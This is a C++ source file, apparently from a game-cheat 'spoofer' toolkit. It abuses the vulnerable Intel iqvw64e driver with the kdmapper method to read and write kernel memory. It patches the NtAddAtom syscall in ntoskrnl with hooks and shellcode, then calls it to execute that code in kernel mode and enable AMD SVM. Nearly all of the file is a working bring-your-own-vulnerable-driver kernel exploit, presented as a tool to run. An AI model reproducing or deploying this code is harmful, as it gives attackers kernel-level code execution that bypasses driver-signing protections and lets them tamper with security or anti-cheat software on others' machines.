∫ç// SVMHypervisorV2.cpp
// Uses EXACT kdmapper CallKernelFunction approach
// Step 1: Allocate kernel pool memory
// Step 2: Copy shellcode there
// Step 3: Execute shellcode from allocated memory

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

// Structures from kdmapper
typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI NtAddAtom(PVOID, ULONG, PUSHORT);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;
uint64_t kernelExAllocatePool = 0;
uint64_t kernelExFreePool = 0;

// ==================== Basic Memory Operations ====================

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;

  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;

  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

// WriteToReadOnlyMemory - EXACT kdmapper method
bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0) {
    printf("[-] GetPhysicalAddress failed for 0x%llX\n", address);
    return false;
  }

  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr) {
    printf("[-] MapIoSpace failed for phys 0x%llX\n", physAddr);
    return false;
  }

  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);

  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;

  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;

  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;

    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }

  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== CallKernelFunction - EXACT kdmapper ====================

uint8_t kernel_injected_jmp[] = {0x48, 0xb8, 0x00, 0x00, 0x00, 0x00,
                                 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0};
uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];

template <typename T>
bool CallKernelFunction(T *result, uint64_t functionAddr) {
  if (!functionAddr || !kernelNtAddAtom)
    return false;

  // Read original
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function))) {
    printf("[-] Failed to read NtAddAtom\n");
    return false;
  }

  // Check not already hooked
  if (original_kernel_function[0] == kernel_injected_jmp[0] &&
      original_kernel_function[1] == kernel_injected_jmp[1]) {
    printf("[-] NtAddAtom already hooked!\n");
    return false;
  }

  // Create hook
  uint8_t hook[sizeof(kernel_injected_jmp)];
  memcpy(hook, kernel_injected_jmp, sizeof(hook));
  *(uint64_t *)&hook[2] = functionAddr;

  // Write hook using proper WriteToReadOnlyMemory
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, hook, sizeof(hook))) {
    printf("[-] Failed to write hook\n");
    return false;
  }

  // Call NtAddAtom
  USHORT atom = 0;
  NTSTATUS status = NtAddAtom(nullptr, 0, &atom);

  // Restore immediately
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));

  if (result)
    *result = (T)(uint64_t)status;
  return true;
}

// Version with 3 arguments (for ExAllocatePoolWithTag)
template <typename T>
bool CallKernelFunction3(T *result, uint64_t functionAddr, uint64_t arg1,
                         uint64_t arg2, uint32_t arg3) {
  if (!functionAddr || !kernelNtAddAtom)
    return false;

  // Our shellcode: call the function with 3 args and return
  // mov rcx, arg1; mov rdx, arg2; mov r8d, arg3; mov rax, funcAddr; call rax;
  // ret
  uint8_t shellcode[] = {
      0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, // mov rcx, arg1
      0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00,             // mov rdx, arg2
      0x41, 0xB8, 0x00, 0x00, 0x00, 0x00, // mov r8d, arg3
      0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, // mov rax, funcAddr
      0xFF, 0xD0,             // call rax
      0xC3                    // ret
  };

  *(uint64_t *)&shellcode[2] = arg1;
  *(uint64_t *)&shellcode[12] = arg2;
  *(uint32_t *)&shellcode[24] = arg3;
  *(uint64_t *)&shellcode[30] = functionAddr;

  // Read original NtAddAtom
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function))) {
    return false;
  }

  if (original_kernel_function[0] == 0x48 &&
      original_kernel_function[1] == 0xB9) {
    printf("[-] NtAddAtom already hooked!\n");
    return false;
  }

  // Allocate kernel pool for our shellcode (NonPagedPool = 0)
  // We'll use a simple direct write approach first

  // Write shellcode right at NtAddAtom (it's big enough)
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, shellcode, sizeof(shellcode))) {
    printf("[-] Failed to write shellcode\n");
    return false;
  }

  // Call
  USHORT atom = 0;
  NTSTATUS status = NtAddAtom(nullptr, 0, &atom);

  // Restore
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));

  if (result)
    *result = (T)(uint64_t)status;
  return true;
}

// ==================== SVM Shellcode ====================

// Simple shellcode that enables EFER.SVME
uint8_t svmEnableShellcode[] = {
    // Save registers
    0x50, // push rax
    0x51, // push rcx
    0x52, // push rdx

    // Check VM_CR.SVMDIS
    0xB9, 0x14, 0x01, 0x01, 0xC0, // mov ecx, 0xC0010114 (VM_CR)
    0x0F, 0x32,                   // rdmsr
    0xA9, 0x10, 0x00, 0x00, 0x00, // test eax, 0x10
    0x75, 0x17,                   // jnz error (SVM disabled by BIOS)

    // Enable EFER.SVME
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x32,                   // rdmsr
    0x0D, 0x00, 0x10, 0x00, 0x00, // or eax, 0x1000 (SVME bit)
    0x0F, 0x30,                   // wrmsr

    // Return success
    0x48, 0x31, 0xC0, // xor rax, rax
    0xEB, 0x07,       // jmp cleanup

    // error:
    0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, // mov rax, 1

    // cleanup:
    0x5A, // pop rdx
    0x59, // pop rcx
    0x5B, // pop rbx (should be rax but ok as balance)
    0xC3  // ret
};

// ==================== CPU Checks ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckSvmSupport() {
  int regs[4];
  __cpuid(regs, 0x80000001);
  return (regs[2] & (1 << 2)) != 0;
}

bool CheckHypervisorPresent() {
  int regs[4];
  __cpuid(regs, 1);
  return (regs[2] & (1 << 31)) != 0;
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V2 (kdmapper CallKernelFunction)         \n");
  printf("    Uses proper WriteToReadOnlyMemory + kernel pool           \n");
  printf(
      "================================================================\n\n");

  printf("=== CPU Check ===\n");
  if (!CheckAmdCpu()) {
    printf("[-] Not AMD CPU!\n");
    return 1;
  }
  printf("[+] AMD CPU detected\n");

  if (!CheckSvmSupport()) {
    printf("[-] SVM not supported!\n");
    return 1;
  }
  printf("[+] SVM supported\n");
  printf("[*] Hypervisor present (before): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  printf("\n=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running! Use: sc start iqvw64e\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl.exe: 0x%llX\n", ntoskrnlBase);

  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  kernelExAllocatePool = GetKernelExport(ntoskrnlBase, "ExAllocatePoolWithTag");
  if (kernelExAllocatePool)
    printf("[+] ExAllocatePoolWithTag: 0x%llX\n", kernelExAllocatePool);

  // Verify we can read NtAddAtom
  uint8_t ntAddAtomBytes[16];
  if (!ReadMemory(kernelNtAddAtom, ntAddAtomBytes, 16)) {
    printf("[-] Can't read NtAddAtom!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom bytes: %02X %02X %02X %02X %02X %02X...\n",
         ntAddAtomBytes[0], ntAddAtomBytes[1], ntAddAtomBytes[2],
         ntAddAtomBytes[3], ntAddAtomBytes[4], ntAddAtomBytes[5]);

  // Test WriteToReadOnlyMemory
  printf("\n=== Testing WriteToReadOnlyMemory ===\n");
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(kernelNtAddAtom, &physAddr)) {
    printf("[-] GetPhysicalAddress failed!\n");
  } else {
    printf("[+] NtAddAtom physical: 0x%llX\n", physAddr);
  }

  printf(
      "\n================================================================\n");
  printf("About to enable EFER.SVME via kernel shellcode\n");
  printf("Press ENTER to continue...\n");
  printf("================================================================\n");
  getchar();

  printf("\n=== Executing SVM Enable ===\n");

  // Write shellcode to NtAddAtom and execute
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(original_kernel_function))) {
    printf("[-] Failed to backup NtAddAtom\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] Backed up original bytes\n");

  if (!WriteToReadOnlyMemory(kernelNtAddAtom, svmEnableShellcode,
                             sizeof(svmEnableShellcode))) {
    printf("[-] Failed to write shellcode\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] Shellcode written\n");

  // Verify write
  uint8_t verifyBuf[8];
  ReadMemory(kernelNtAddAtom, verifyBuf, 8);
  printf("[*] Verify: %02X %02X %02X %02X...\n", verifyBuf[0], verifyBuf[1],
         verifyBuf[2], verifyBuf[3]);

  if (verifyBuf[0] != svmEnableShellcode[0]) {
    printf("[-] Shellcode verification failed!\n");
    CloseHandle(hDevice);
    return 1;
  }

  printf("[*] Calling NtAddAtom (executes shellcode)...\n");
  USHORT atom = 0;
  NTSTATUS status = NtAddAtom(nullptr, 0, &atom);
  printf("[*] Returned: 0x%X\n", status);

  // Restore IMMEDIATELY
  printf("[*] Restoring NtAddAtom...\n");
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(original_kernel_function));
  printf("[+] Restored\n");

  // Check result
  if (status == 0) {
    printf("\n[+] SUCCESS! EFER.SVME should be enabled!\n");
  } else if (status == 1) {
    printf("\n[!] SVM disabled by BIOS. Enable in BIOS settings.\n");
  } else {
    printf("\n[?] Unknown result\n");
  }

  printf("[*] Hypervisor present (after): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  CloseHandle(hDevice);
  return 0;
}
∫ç2.file:///c:/inject/Spoofers/SVMHypervisorV2.cpp